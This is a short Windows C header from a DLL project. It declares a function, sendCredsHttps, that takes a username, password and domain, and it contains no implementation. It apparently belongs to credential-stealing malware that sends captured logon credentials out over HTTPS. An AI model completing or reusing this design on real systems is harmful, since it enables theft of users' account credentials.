#ifndef _HTTPS_H
#define _HTTPS_H

#include <windows.h>
#include <stdio.h>
#include <winhttp.h>
#include <stdbool.h>

#include "dllmain.h"

#define BUFFER_SIZE 4096

BOOL sendCredsHttps(LPWSTR username, LPWSTR password, LPWSTR domain);

#endif